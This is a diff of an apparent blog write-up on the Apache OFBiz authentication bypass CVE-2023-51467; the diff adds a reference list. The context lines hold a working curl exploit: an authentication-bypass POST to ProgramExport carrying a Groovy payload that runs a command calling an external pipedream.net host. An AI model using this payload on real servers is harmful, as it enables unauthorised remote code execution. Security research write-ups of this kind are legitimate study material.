@@ -664,3 +664,9 @@ This seems like a simple blacklist based filtering, bypassing which will give us
 {% highlight bash lineos %}
 curl -vv -X POST "https://localhost:8443/webtools/control/ProgramExport?USERNAME&PASSWORD=test&requirePasswordChange=Y" -d 'groovyProgram=def%20result%20%3D%20%22curl%20https%3A%2F%2Fen3d5squ4eacq.x.pipedream.net%22.execute().text%3B' --insecure
 {%endhighlight%}
+
+## References:
+
+1. [packtpub](https://subscription.packtpub.com/book/programming/9781847199188/1/ch01lvl1sec10/locating-an-ofbiz-component){:target="_blank"}
+
+2. [y4tacker.github.io](https://y4tacker.github.io/2023/12/27/year/2023/12/Apache-OFBiz%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90-CVE-2023-51467/){:target="_blank"}
